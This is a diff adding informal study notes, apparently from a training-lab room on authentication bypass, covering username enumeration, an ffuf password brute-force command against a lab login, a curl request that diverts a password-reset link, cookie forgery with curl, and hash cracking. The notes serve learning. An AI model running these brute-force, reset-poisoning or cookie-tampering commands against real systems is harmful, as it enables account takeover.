@@ -1,0 +1,76 @@
+authentication bypass
+
+errors sometimes gives us clues
+
+supposingly if an error message says USERNAME EXISTS --so using this quote we can try numerous of username to se matches using ffuf
+
+/Rooms/caldera/caldera/plugins/atomic/data/atomic-red-team/atomics/T1087.002/src..this is wher my files have been saved  I mean username.txt
+
+learn how to store the output properly in a file only usernames wala
+
+
+so till now we learnt that ffuf can help us find usernames based on the error messages--check the command
+
+
+lets now brute force these in the login of customer 
+
+
+echo -e "steve\nrobert\nsimon" > /root/Valid_username.txt||remember this new command
+
+A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.
+
+
+ffuf -w Valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.138.195/customers/login -fc 200
+
+using above command we found login credentials
+
+
+
+---------------------------------
+
+logic flaws in authentication mechanisim
+
+while the intended part may be 1-2-3-4===a hacker would 1---4
+
+example if exactly admin has been filtered and bloced to be accesed then a hacker ay try Admin
+
+
+
+-----------------------------------------
+curl 'http://10.10.195.6/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'||making of an request||learn curl
+
+
+using the misconfiguration we were able to share the resent link of one user to ours email
+
+
+
+-------------------------------------------------
+cookie manipulation can have many outcomes--authbypass
+
+plain text--cookie
+
+Set-Cookie: logged_in=true; Max-Age=3600; Path=/
+Set-Cookie: admin=false; Max-Age=3600; Path=/
+
+
+cookie manipulation 
+curl http://10.10.253.186/cookie-test ||simple webpage request
+
+look how -h flags help us fit  queries
+
+curl -H "Cookie: logged_in=true; admin=false" http://10.10.253.186/cookie-test
+
+
+Sometimes cookie values can look like a long string of random characters; these are called hashes 
+
+md5||sha-256||sha-512||sha1
+
+services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.
+
+encoding binary data to human-readable-text--for safe transmisions
+Common encoding types are base32 which converts binary data to the characters A-Z and 2-7,
+ base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.(padding?space)
+
+example||https://fusionauth.io/dev-tools/base64-encoder-decoder||this website can also be used
+
+
